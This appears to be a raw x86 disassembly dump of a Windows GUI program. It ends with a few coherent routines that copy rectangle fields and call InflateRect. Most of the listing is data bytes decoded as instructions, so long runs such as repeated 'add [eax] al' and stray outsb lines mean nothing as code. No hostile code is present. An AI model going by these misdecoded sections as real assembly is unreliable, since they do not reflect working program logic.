[ esp - 0x5b9bffbd ]
jb r-xdata
inc ebx
add [ ecx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx + eax + 0xd5cff00 ] ah
inc esp
cwde
inc esp
add [ eax + eax ] bh
inc [ ebx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
inc edi
je r-xdata
aam 0x13
inc ecx
add al al
add [ eax ] eax
inc eax
adc eax [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
movsb [ edi ] fs : [ esi ]
push esp
inc ebx
add ah al
mov esp 0xe0004356
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xbc6f666e
push esi
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
dec edi
pop eax
inc ebx
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
pop ecx
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
pop ebx
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
adc eax [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
push es
dec edi
outsb
inc ebp
js r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
jbe r-xdata
dec edi
or cl [ edi + 0x6e ]
jb r-xdata
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffbd6a ] cl
xchg esi eax
inc edx
add [ edx + eax ] ah
add [ eax ] al
pop eax
std
jb r-xdata
xor al 0x57
inc ebx
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
je r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ecx
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x50 ] bp
pop ecx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
pop edx
inc ebx
add [ eax - 0x4700ffff ] bh
inc edx
add ah al
mov al 0x42
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add al ch
daa
inc esp
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax - 0x70 ]
sub [ ebx ] al
push eax
mov ch 0x42
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x42b4e8ff ]
add [ eax ] ch
mov ch 0x42
add [ esi * 4 - 0x4aabffbe ] bh
inc edx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
add [ eax - 0x3 ] bl
inc esp
outsd
arpl [ ebx + 0x8 ] bp
pop ecx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
pop ebx
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9419376
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
adc eax [ ecx ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
pushad
xor eax [ eax ]
mov al [ 0xffffffff9c0043e6 ]
je r-xdata
xor [ eax ] al
mov eax 0x78004030
mov al 0x42
pushad
xor eax [ eax ]
mov al [ 0xffffffff9c0043e6 ]
jb r-xdata
je r-xdata
outsd
jne r-xdata
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add al ch
daa
inc esp
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax - 0x70 ]
sub [ ebx ] al
push eax
mov ch 0x42
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
adc al 0x98
inc edx
add [ edi ] al
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] al
mov eax 0x78004030
mov al 0x42
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
rcl [ esi + 0x11070042 ] 0x54
inc ebx
jne r-xdata
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah dl
mov dl 0x42
add [ eax + ebx * 4 ] bl
inc ebx
add al ch
mov dl 0x42
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al ch
scasd [ edi ]
inc edx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] ah
inc ebx
add [ eax ] ch
rol [ ebx ] cl
enter 0x43df 0x0
sub [ eax ] 0x43
add [ eax - 0x1fffbc24 ] dh
fiadd [ ebx ]
pushad
loopne r-xdata
push ss
inc esp
jb r-xdata
add [ eax ] cl
inc edx
xor al 0x97
inc edx
add [ esi + edx * 4 + 0x2f0042 ] bh
or [ ebp + 0x78 ] al
je r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add ah dl
mov dl 0x42
add [ eax + ebx * 4 ] bl
inc ebx
add al ch
mov dl 0x42
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add ah al
pushfd
fiadd [ ebx ]
sub [ ebx + 0x41 ] al
je r-xdata
add [ eax + 0x16 ] al
out 0x43 al
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x50 ] bh
inc edx
movsb [ di ] [ si ]
pop edx
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x48 ] bp
xchg ebp eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xchg esi eax
add [ eax ] al
add [ eax ] al
xor ah 0xff
imul ebp [ edi + 0x6e ] sub_41aeb8
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov [ edx ] ss
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
mov [ 0xffffffffc33c0043 ] eax
insb
jae r-xdata
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax 0x9c004295
inc [ edx ]
or eax [ eax ]
or [ ebp + 0x78 ] al
je r-xdata
add bh bh
in al dx
movsb [ edi ] [ esi ]
inc ebx
add [ eax ] cl
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add dh bh
jo r-xdata
add [ ecx ] ah
add bh bh
mov al [ 0x3c004396 ]
xchg edi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
add [ eax ] dh
dec esi
inc ebx
add [ ebx ] bl
add bh bh
pushad
cwde
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x16 ] al
inc esp
out 0x43 al
add [ eax + esi + 0x30b80040 ] bl
inc eax
add [ eax - 0x50 ] bh
inc edx
je r-xdata
inc ebx
je r-xdata
adc [ eax ] al
pop es
inc ebx
adc [ eax ] al
sbb al 0x2
add bh bh
dec esp
mov bl 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
[ eax + 0xc ]
add [ eax ] cl
inc ebp
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
push ebp
inc ebx
add [ ebx + 0x43 ] cl
add [ ebx + 0x43 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add al ch
scasd [ edi ]
inc edx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0xffffffffe53c0043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ eax + ebp ] ah
inc ebx
add [ eax ] ch
rol [ ebx ] cl
enter 0x43df 0x0
sub [ eax ] 0x43
add [ eax - 0x1fffbc24 ] dh
fiadd [ ebx ]
pushad
loopne r-xdata
insb
jae r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ eax + ebx + 0x4e ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jl r-xdata
inc ebx
add [ edi + edx * 4 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 ] dl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 ] al
inc edx
add [ eax ] ch
add al [ eax ]
add [ ebp + edx * 4 + 0x42 ] ch
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
pop eax
push ebp
inc ebx
add [ eax ] al
add [ ebx + eax * 8 ] bh
inc ebx
inc [ eax - 0x5c ]
jae r-xdata
add [ 0x6d657449 ] al
adc [ eax ] al
sbb [ edx ] al
add bh bh
test [ ebx + 0x10042 ] dh
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
pop ss
add [ ecx ] cl
dec ecx
je r-xdata
inc ebx
add [ eax - 0x5c ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add bh bh
inc eax
movsb [ edi ] [ esi ]
jb r-xdata
push esi
inc ebx
add [ eax + eax ] dh
call [ eax + ecx * 8 ]
inc ebx
add [ ecx ] al
add [ esi ] cl
insd
dec ecx
outsb
js r-xdata
outsd
insb
jne r-xdata
push esp
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jb r-xdata
inc esp
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0019 ] al
outsd
outsb
jae r-xdata
sbb eax 0x2140041
add bh bh
add [ edx + eax * 2 + 0x100 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49050018 ] al
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ esi ] cl
outsb
je r-xdata
movsd [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
push cs
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
outsb
je r-xdata
sbb al 0x0
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
je r-xdata
add [ eax ] eax
add [ eax ] al
jae r-xdata
insd
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
insb
mov [ 0xffffffffc3bc0043 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
sbb eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
inc esp
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
outsb
je r-xdata
or al 0x44
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0x98ff0001
or al 0x44
add [ eax ] al
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x50 ] bp
js r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebp + ecx + 0x44 ]
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
js r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500b00
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ecx + eax + 0xd5cff00 ] ah
inc esp
cwde
inc esp
add [ eax + eax ] bh
inc [ ebx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090020 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ ebp + ecx + 0x44 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
les ecx [ esp + eax * 2 ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
push ebx
je r-xdata
aam 0x13
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
outsb
inc ebp
outsb
je r-xdata
pop ecx
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
push eax
outsd
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
[ edx + 0x43 ]
adc [ eax ] al
cdq
add [ eax ] al
[ esp - 0x5b9bffbd ]
jb r-xdata
inc ebx
add [ ecx ] al
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc [ ebp + 0x10043 ] ah
add [ eax ] al
adc [ eax ] al
0xc0ff0000 0x43a4
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al ch
pushfd
xor edi edi
dec [ ebx + 0x4589f045 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
jb r-xdata
push ebx
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080021 ] al
push 0x6948776f
outsb
je r-xdata
movsb [ edi ] fs : [ esi ]
push esp
inc ebx
add ah al
inc ebp
loopne r-xdata
inc esp
outsd
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
jb r-xdata
outsb
dec edi
adc eax [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0xd4656c62
adc eax [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
fadd st3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070025 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
pop eax
inc ebx
add al ch
add [ eax ] al
arpl [ ebx + 0x8 ] bp
pop ecx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002e ] al
outsb
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
inc ebx
add al 0x89
inc ebp
in al 0x8b
inc ebp
clc
dec [ ebx + 0x508b0845 ]
or al 0x8b
inc ebp
or [ ebx + 0x408bf840 ] cl
adc al ch
push edx
xor edi edi
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d114
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
je r-xdata
mov ecx 0x2
call sub_41d89c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d114
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d89c
pop ebx
mov esp ebp
pop ebp
retn
fmul [ ebx + 0x408b0845 ]
clc
lea eax [ bx + si ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
pop ebx
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
sub_429d40
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d114
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d89c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d114
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41d89c
pop ebx
mov esp ebp
pop ebp
retn
sub_429e04
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d220
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_429d40
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_429e64
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_441cbc
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb70
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42a2a8
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_403318
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_439b2c
mov edx 0x69
mov eax ebx
call sub_439b08
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_429efc
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403104
mov edx ebx
and dl 0xfc
mov eax esi
call sub_441d18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_429f48
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_420188
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_4201a0
mov edi eax
mov eax ebx
call sub_439d50
mov [ esp ] eax
mov eax ebx
call sub_439d94
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
